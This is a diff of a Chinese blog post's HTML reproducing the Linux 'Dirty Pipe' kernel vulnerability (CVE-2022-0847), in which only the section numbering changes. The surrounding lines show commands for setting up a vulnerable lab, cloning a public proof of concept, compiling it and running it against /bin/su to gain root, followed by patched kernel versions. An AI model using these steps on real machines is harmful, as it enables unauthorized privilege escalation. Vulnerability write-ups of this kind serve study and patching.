@@ -495,7 +495,7 @@ sudo .&#x2F;metarget cnv install cve-2022-0847<span aria-hidden="true" class="li
 
 <p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203081202399.png" alt="img"></p>
 <p>可以看到系统内核已经是 5.8 的了，说明是可能受到该漏洞的影响了。</p>
-<h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><h2 id="方法一：CVE-2022-0847-DirtyPipe-Exploit"><a href="#方法一：CVE-2022-0847-DirtyPipe-Exploit" class="headerlink" title="方法一：CVE-2022-0847-DirtyPipe-Exploit"></a>方法一：CVE-2022-0847-DirtyPipe-Exploit</h2><p>把 POC git 下来</p>
+<h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="方法一：CVE-2022-0847-DirtyPipe-Exploit"><a href="#方法一：CVE-2022-0847-DirtyPipe-Exploit" class="headerlink" title="方法一：CVE-2022-0847-DirtyPipe-Exploit"></a>方法一：CVE-2022-0847-DirtyPipe-Exploit</h2><p>把 POC git 下来</p>
 <pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;Arinerron&#x2F;CVE-2022-0847-DirtyPipe-Exploit
 cd CVE-2022-0847-DirtyPipe-Exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
@@ -523,7 +523,7 @@ gcc dirtypipez.c -o dirtypipez<span aria-hidden="true" class="line-numbers-rows"
 <pre class="line-numbers language-none"><code class="language-none">.&#x2F;dirtypipez &#x2F;bin&#x2F;su <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203081204783.png" alt="img"></p>
-<h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h1><p>更新升级 Linux 内核到以下安全版本：</p>
+<h1 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04 漏洞修复"></a>0x04 漏洞修复</h1><p>更新升级 Linux 内核到以下安全版本：</p>
 <ul>
 <li>Linux 内核 &gt;= 5.16.11</li>
 <li>Linux 内核 &gt;= 5.15.25</li>
